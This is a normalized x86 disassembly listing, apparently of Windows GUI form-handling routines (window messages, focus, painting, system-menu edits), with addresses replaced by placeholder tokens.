mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_453380
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43c61c
push 0x0
mov eax ebx
call sub_43f228
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4533c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43cda0
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43f228
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43f228
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_453428
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4534d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4534d7
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax edi
call sub_44f7bc
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403454
mov eax ebx
call sub_4537e0
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403454
test al al
jne r-xdata
sub_4534e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43bd04
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43bd04
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_453428
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_453528
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_453428
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45354c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4138f0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413828
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4138f0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413828
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4537bc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43f228
mov dx 0xb000
call sub_44f57c
test al al
jne r-xdata
call sub_43f228
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44f57c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4537c3
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403a78
jmp r-xdata
call sub_403a78
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43bd04
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43f228
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44f57c
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_439bf4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
call sub_403a78
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43f228
mov dx 0xb01a
call sub_44f57c
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403a78
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_439bf4
sub_4537e0
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_439bf4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43f228
push eax
call SetFocus
mov eax ebx
call sub_43f228
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_453830
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_439bf4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4538e4
mov eax esi
call sub_4537e0
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43f650
mov edx eax
mov eax esi
call sub_453428
sub_453894
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4524ac
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_439bf4
mov eax ebx
call sub_4524ac
mov edx esi
call sub_453894
sub_4538e4
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44c908
mov edx esi
call sub_44c8ec
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45398c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43f228
push eax
call SendMessageA
sub_4539d8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45398c
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_453a08
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45398c
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_453a74
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_453b22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d4b8
xor eax eax
push ebp
push sub_453aff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b06
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d4b8
retn
sub_453b30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4524ac
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_4524e0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403454
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43e4f0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45252c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403454
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_453bd0
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43f228
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_453a58
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43f228
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_43d3b8
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_453c4e
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_453cb0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_43d67c
pop edi
pop esi
retn
sub_453cfc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_453df8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_452820
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_453cfc
pop ecx
sub_453e2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a110
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43f228
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_4390e8
pop esi
pop ebx
retn
sub_453ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43e47c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44c328
sub_453f1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d518
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44bd3c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_453f68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44c59c
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_453fa0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45403b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454042
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44bc9c
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458d5c
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_435ba4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_458d5c
jmp r-xdata
sub_454068
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403454
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4540a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c6b4
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4540d4
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_453894
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43597c
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45412c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43e360
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457710
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403454
sub_4541b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43f228
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43f228
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454250
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43f228
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_453830
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403454
sub_4542a8
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43f75c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4542d4
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_453894
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4542f0
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44bccc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44bccc
sub_454330
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_454368
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fe4
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45439c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4544ed
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4544f4
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4542f0
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_435920
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412350
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_438558
lea eax [ ebp - 0x1c ]
call sub_4068b4
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4542f0
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_454330
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_458a00
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_458a68
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_458a68
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_454368
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412350
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_438558
lea eax [ ebp - 0x1c ]
call sub_4068b4
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_458998
test [ esi + 0x228 ] 0x8
je r-xdata
sub_4544fc
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_454570
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45459c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d7c4
pop esi
